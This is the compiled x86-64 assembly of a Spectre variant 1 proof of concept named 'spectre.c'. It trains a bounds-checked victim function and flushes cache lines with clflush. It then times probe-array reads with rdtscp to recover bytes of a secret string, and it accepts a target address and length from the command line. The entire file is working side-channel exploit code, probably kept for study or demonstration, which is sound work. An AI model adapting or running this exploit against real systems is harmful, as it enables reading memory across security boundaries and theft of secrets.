	.file	"spectre.c"
	.intel_syntax noprefix
	.text
	.globl	check
	.type	check, @function
check:
.LFB5689:
	.cfi_startproc
	endbr64
	mov	eax, DWORD PTR array1_size[rip]
	cdqe
	cmp	rax, rdi
	seta	al
	movzx	eax, al
	ret
	.cfi_endproc
.LFE5689:
	.size	check, .-check
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5690:
	.cfi_startproc
	endbr64
	mov	eax, DWORD PTR array1_size[rip]
	cdqe
	cmp	rax, rdi
	jbe	.L2
	sub	edi, 1
	js	.L2
	movzx	ecx, BYTE PTR temp[rip]
	movsx	rdx, edi
	lea	rdi, array2[rip]
	lea	rsi, array1[rip]
.L4:
	movzx	eax, BYTE PTR [rsi+rdx]
	sal	eax, 9
	cdqe
	and	cl, BYTE PTR [rdi+rax]
	sub	rdx, 1
	test	edx, edx
	jns	.L4
	mov	BYTE PTR temp[rip], cl
.L2:
	ret
	.cfi_endproc
.LFE5690:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5691:
	.cfi_startproc
	endbr64
	push	r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	push	r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	push	r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	push	r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	push	rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	push	rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	sub	rsp, 56
	.cfi_def_cfa_offset 112
	mov	QWORD PTR 24[rsp], rdi
	mov	rax, QWORD PTR fs:40
	mov	QWORD PTR 40[rsp], rax
	xor	eax, eax
	mov	DWORD PTR 32[rsp], 0
	lea	rax, results[rip]
	lea	rdx, 1024[rax]
.L7:
	mov	DWORD PTR [rax], 0
	add	rax, 4
	cmp	rax, rdx
	jne	.L7
	mov	DWORD PTR 20[rsp], 999
	lea	r13, array2[rip+131072]
	lea	r12, -131072[r13]
	lea	r14, array1[rip]
	jmp	.L8
.L10:
	movsx	rax, ebx
	imul	rax, rax, 715827883
	shr	rax, 32
	mov	edx, ebx
	sar	edx, 31
	sub	eax, edx
	lea	edx, [rax+rax*2]
	add	edx, edx
	mov	eax, ebx
	sub	eax, edx
	sub	eax, 1
	mov	ax, 0
	cdqe
	mov	rdi, rax
	shr	rdi, 16
	or	rdi, rax
	and	rdi, QWORD PTR 8[rsp]
	xor	rdi, r15
	call	victim_function
	sub	ebx, 1
	cmp	ebx, -1
	je	.L23
.L12:
	clflush	array1_size[rip]
	mov	DWORD PTR 36[rsp], 0
	mov	eax, DWORD PTR 36[rsp]
	cmp	eax, 99
	jg	.L10
.L11:
	mov	eax, DWORD PTR 36[rsp]
	add	eax, 1
	mov	DWORD PTR 36[rsp], eax
	mov	eax, DWORD PTR 36[rsp]
	cmp	eax, 99
	jle	.L11
	jmp	.L10
.L23:
	mov	esi, 13
	lea	r9, results[rip]
	jmp	.L14
.L25:
	movsx	r8, r8d
	add	DWORD PTR [r9+r8*4], 1
.L13:
	add	esi, 167
	cmp	esi, 42765
	je	.L24
.L14:
	movzx	r8d, sil
	mov	r10d, r8d
	sal	r10d, 9
	rdtscp
	mov	rdi, rax
	mov	DWORD PTR 32[rsp], ecx
	sal	rdx, 32
	or	rdi, rdx
	movsx	r10, r10d
	movzx	eax, BYTE PTR [r12+r10]
	rdtscp
	mov	DWORD PTR 32[rsp], ecx
	sal	rdx, 32
	or	rax, rdx
	sub	rax, rdi
	cmp	rax, 50
	ja	.L13
	mov	ecx, DWORD PTR array1_size[rip]
	mov	eax, ebp
	cdq
	idiv	ecx
	movsx	rdx, edx
	movzx	eax, BYTE PTR [r14+rdx]
	cmp	eax, r8d
	jne	.L25
	jmp	.L13
.L24:
	sub	DWORD PTR 20[rsp], 1
	je	.L15
.L8:
	mov	ebp, DWORD PTR 20[rsp]
	lea	rax, array2[rip]
.L9:
	clflush	[rax]
	add	rax, 512
	cmp	r13, rax
	jne	.L9
	mov	ecx, DWORD PTR array1_size[rip]
	mov	eax, ebp
	cdq
	idiv	ecx
	movsx	r15, edx
	mov	ebx, 29
	mov	rax, QWORD PTR 24[rsp]
	xor	rax, r15
	mov	QWORD PTR 8[rsp], rax
	jmp	.L12
.L15:
	mov	eax, DWORD PTR results[rip]
	xor	eax, DWORD PTR 32[rsp]
	mov	DWORD PTR results[rip], eax
	mov	rax, QWORD PTR 40[rsp]
	sub	rax, QWORD PTR fs:40
	jne	.L26
	add	rsp, 56
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	rbp
	.cfi_def_cfa_offset 40
	pop	r12
	.cfi_def_cfa_offset 32
	pop	r13
	.cfi_def_cfa_offset 24
	pop	r14
	.cfi_def_cfa_offset 16
	pop	r15
	.cfi_def_cfa_offset 8
	ret
.L26:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5691:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC0:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC1:
	.string	"%p"
.LC2:
	.string	"%d"
	.section	.rodata.str1.8
	.align 8
.LC3:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC4:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.8
	.align 8
.LC5:
	.string	"Reading at malicious_x = %p secc= %c sec_ascii=%d ...\n"
	.section	.rodata.str1.1
.LC6:
	.string	"result[%d]=%d "
.LC7:
	.string	"\n"
.LC8:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB5692:
	.cfi_startproc
	endbr64
	push	r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	push	r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	push	r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	push	r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	push	rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	push	rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	sub	rsp, 72
	.cfi_def_cfa_offset 128
	mov	DWORD PTR 4[rsp], edi
	mov	QWORD PTR 8[rsp], rsi
	mov	rax, QWORD PTR fs:40
	mov	QWORD PTR 56[rsp], rax
	xor	eax, eax
	lea	r13, .LC6[rip]
.L28:
	mov	rdi, QWORD PTR stdin[rip]
	call	getc@PLT
	cmp	al, 114
	je	.L43
	cmp	al, 10
	je	.L28
	cmp	al, 105
	jne	.L37
	mov	eax, 0
	call	getpid@PLT
	mov	ecx, eax
	lea	rdx, check[rip+33]
	lea	rsi, .LC8[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	jmp	.L28
.L43:
	mov	rdx, QWORD PTR secret[rip]
	mov	rcx, rdx
	lea	rsi, .LC0[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	mov	rdi, QWORD PTR secret[rip]
	lea	rdx, array1[rip]
	mov	rax, rdi
	sub	rax, rdx
	mov	QWORD PTR 32[rsp], rax
	call	strlen@PLT
	mov	DWORD PTR 28[rsp], eax
	lea	rax, array2[rip]
	lea	rdx, 131072[rax]
.L30:
	mov	BYTE PTR [rax], 1
	add	rax, 1
	cmp	rax, rdx
	jne	.L30
	cmp	DWORD PTR 4[rsp], 3
	je	.L44
.L31:
	mov	edx, DWORD PTR 28[rsp]
	lea	rsi, .LC4[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	mov	eax, DWORD PTR 28[rsp]
	sub	eax, 1
	mov	DWORD PTR 28[rsp], eax
	js	.L28
	mov	r14d, 0
	lea	r15, .LC5[rip]
	jmp	.L35
.L44:
	lea	rdx, 32[rsp]
	mov	rbx, QWORD PTR 8[rsp]
	mov	rdi, QWORD PTR 8[rbx]
	lea	rsi, .LC1[rip]
	mov	eax, 0
	call	__isoc99_sscanf@PLT
	lea	rax, array1[rip]
	sub	QWORD PTR 32[rsp], rax
	lea	rdx, 28[rsp]
	mov	rdi, QWORD PTR 16[rbx]
	lea	rsi, .LC2[rip]
	mov	eax, 0
	call	__isoc99_sscanf@PLT
	mov	ecx, DWORD PTR 28[rsp]
	mov	rdx, QWORD PTR 32[rsp]
	lea	rsi, .LC3[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	jmp	.L31
.L46:
	mov	rsi, r13
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	mov	ecx, DWORD PTR [rbx]
	mov	edx, ebp
	mov	rsi, r13
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
.L33:
	add	ebp, 1
	add	rbx, 4
	cmp	ebp, 256
	je	.L45
.L34:
	lea	edx, -1[rbp]
	mov	ecx, DWORD PTR -4[rbx]
	mov	eax, DWORD PTR [rbx]
	cmp	ecx, eax
	jle	.L33
	mov	esi, ecx
	sub	esi, eax
	cmp	esi, 100
	jle	.L33
	jmp	.L46
.L45:
	lea	rsi, .LC7[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	mov	eax, DWORD PTR 28[rsp]
	sub	eax, 1
	mov	DWORD PTR 28[rsp], eax
	add	r14, 1
	test	eax, eax
	js	.L28
.L35:
	mov	rax, QWORD PTR secret[rip]
	movsx	ecx, BYTE PTR [rax+r14]
	mov	r8d, ecx
	mov	rdx, QWORD PTR 32[rsp]
	mov	rsi, r15
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	mov	rdi, QWORD PTR 32[rsp]
	lea	rax, 1[rdi]
	mov	QWORD PTR 32[rsp], rax
	lea	rdx, 44[rsp]
	lea	rsi, 54[rsp]
	call	readMemoryByte
	lea	rbx, results[rip+4]
	mov	ebp, 1
	jmp	.L34
.L37:
	mov	rax, QWORD PTR 56[rsp]
	sub	rax, QWORD PTR fs:40
	jne	.L47
	mov	eax, 0
	add	rsp, 72
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	rbp
	.cfi_def_cfa_offset 40
	pop	r12
	.cfi_def_cfa_offset 32
	pop	r13
	.cfi_def_cfa_offset 24
	pop	r14
	.cfi_def_cfa_offset 16
	pop	r15
	.cfi_def_cfa_offset 8
	ret
.L47:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5692:
	.size	main, .-main
	.local	results
	.comm	results,1024,32
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.8
	.align 8
.LC9:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC9
	.globl	array2
	.bss
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	unused2
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
